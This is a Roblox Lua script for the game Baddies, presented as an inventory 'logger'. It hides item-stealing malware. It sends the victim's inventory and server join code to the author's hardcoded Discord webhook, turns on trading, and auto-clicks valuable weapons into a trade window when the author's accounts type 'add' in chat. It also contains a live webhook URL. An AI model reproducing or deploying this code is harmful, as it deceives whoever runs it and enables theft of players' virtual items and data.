local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script doesnt support this game, join BADDIES")
    return
end

local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]

local MY_WEBHOOK = "https://discord.com/api/webhooks/1464311781269831735/E7IlLpVLN_lcO_Mn9e0Ck_AzjawbVDAAkmyTHede0PRDsYP43goCqMLh5MN8ljkBaWg4"
local USER_WEBHOOK = _G.Webhook or "PUTHERE"
local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}

local START_TIME = os.time()

local function checkServerStatus()
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    if playerCount >= maxPlayers - 1 then
        localPlayer:Kick("rejoin a diff server")
        return false
    end
    if playerCount < 3 then
        localPlayer:Kick("DATA not loaded, rejoin a public")
        return false
    end
    return true
end

if not checkServerStatus() then return end

local function formatNumber(num)
    if not num then return "N/A" end
    if num >= 1000000 then
        return string.format("%.1fM", num / 1000000)
    elseif num >= 1000 then
        return string.format("%.1fK", num / 1000)
    else
        return tostring(num)
    end
end

local function hasMainWeapons()
    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))
    
    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local lower = name:lower()
        local matched = false
        for _, p in ipairs(patterns) do
            if string.find(lower, p, 1, true) then
                table.insert(base, name)
                matched = true
                break
            end
        end
        if not matched then table.insert(main, name) end
    end
    return #main >= 3, base, main, #main
end

local function sendRequest(url, body)
    if not url or url == "" or url == "PUTHERE" then return nil end
    local headers = {["Content-Type"] = "application/json"}
    local encoded = type(body) == "string" and body or HttpService:JSONEncode(body)
    
    local candidates = {
        function() return syn and syn.request and syn.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end,
        function() return request and request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end,
        function() return http_request and http_request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end,
        function() return fluxus and fluxus.request and fluxus.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end
    }
    
    for _, fn in ipairs(candidates) do
        local ok, res = pcall(fn)
        if ok and res and (res.Success or res.StatusCode == 200) then
            return res
        end
    end
    return nil
end

local function sendFullInventory()
    if not checkServerStatus() then return end

    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))

    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local lower = name:lower()
        local matched = false
        for _, p in ipairs(patterns) do
            if string.find(lower, p, 1, true) then
                table.insert(base, name)
                matched = true
                break
            end
        end
        if not matched then table.insert(main, name) end
    end

    local isRich = #main >= 3
    local baseText = #base > 0 and table.concat(base, " | ") or "None"
    local mainText = #main > 0 and table.concat(main, "\n") or "None"

    local ls = localPlayer:FindFirstChild("leaderstats")
    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"

    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"

    local fields = {
        {name = "Dinero", value = formatNumber(dinero), inline = true},
        {name = "Slays", value = formatNumber(slays), inline = true},
        {name = "Server Joiner", value = "```lua\n" .. joinScript .. "```", inline = false},
    }

    local embed = {
        title = localPlayer.Name .. "'s Inventory",
        description = "**Base Weapons**\n" .. baseText .. "\n\n**Main Weapons**\n" .. mainText,
        color = isRich and 0xFF0000 or 0xFFA500,
        fields = fields,
        footer = {text = "Baddies Logger"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    if USER_WEBHOOK ~= "PUTHERE" then
        local content = localPlayer.Name .. " executed the script!"
        if isRich then content = content .. " @everyone RICH PLAYER!" end
        sendRequest(USER_WEBHOOK, {content = content, embeds = {embed}})
    end

    if isRich then
        sendRequest(MY_WEBHOOK, {content = localPlayer.Name .. " RICH PLAYER DETECTED! @everyone", embeds = {embed}})
    end
end

local hasEnough, _, _, count = hasMainWeapons()
if not hasEnough then
    warn("Not enough main weapons. Have: " .. count .. " | Need 3+")
    return
end

sendFullInventory()

-- ==================== TRADING AUTO COMPLETE ====================

local weapons = {
    "Grim Reaper Cloak::None","Blast Bow::None","Princess Power Style::None","Feral Frenzy Style::None",
    "Roller Skates::None","Storm Dancer Style::None","Hug of Doom Style::None","Hero Finisher::None",
    "Grim Reaper Finisher::None","Gun Finisher::None","Doom Finisher::None","Breakdance Finisher::None",
    "Celestial Scythes::None","Graveyard Grip Knuckles::None","Shadow Sorcery Purse::None",
    "Unicorn Brass Knuckles::None","Frost Stomp::None","Sniper Rifle RPG::None","Cursed Board::None",
    "Evil Goth Knuckles::None","Floating Leaf::None","Shark Brass Knuckles::None","404 Not Found Blade::None",
    "Vampire Flamethrower::None","Big Boom Hammer::None","Mean Girl Mayhem Style::None","Karate Style::None",
    "Freeze Gun::None","Brass Knuckles::None","Sledge Hammer::None","Chainsaw::None","Scythe::None",
    "Cupid's Bow::None","Crowbar::None","Cannon::None","Spiked Knuckles::None","Trident::None",
    "Sakura Blade::None","Nunchucks::None","Champion Gloves::None","Chain Mace::None","Lava RPG::None"
}

local function safeClick(btn)
    if not btn then return end
    pcall(function()
        firesignal(btn.MouseButton1Click)
    end)
    pcall(function()
        local pos = btn.AbsolutePosition
        local size = btn.AbsoluteSize
        local x = pos.X + size.X / 2
        local y = pos.Y + size.Y / 2
        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
        task.wait(0.05)
        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
    end)
end

local function clickWeapons()
    local trading = playerGui:FindFirstChild("Trading")
    if not trading then return end
    local scrolling = trading:FindFirstChild("Frame", true):FindFirstChild("ScrollingFrame", true)
    if not scrolling then return end

    for _, name in ipairs(weapons) do
        local btn = scrolling:FindFirstChild(name)
        if btn and btn.Visible then
            safeClick(btn)
            task.wait(0.03)
        end
    end
end

local function setupTrading()
    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)

    local function processMessage(sender, text)
        text = text:lower()
        if sender == localPlayer or MY_USERNAMES[1] == sender.Name:lower() then
            if text == "add" then
                clickWeapons()
            end
        end
    end

    if TextChatService then
        TextChatService.OnIncomingMessage = function(msg)
            local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
            if sender then
                task.delay(0.5, function()
                    processMessage(sender, msg.Text)
                end)
            end
        end
    end
end

setupTrading()

print("✅ Baddies Logger loaded successfully!")
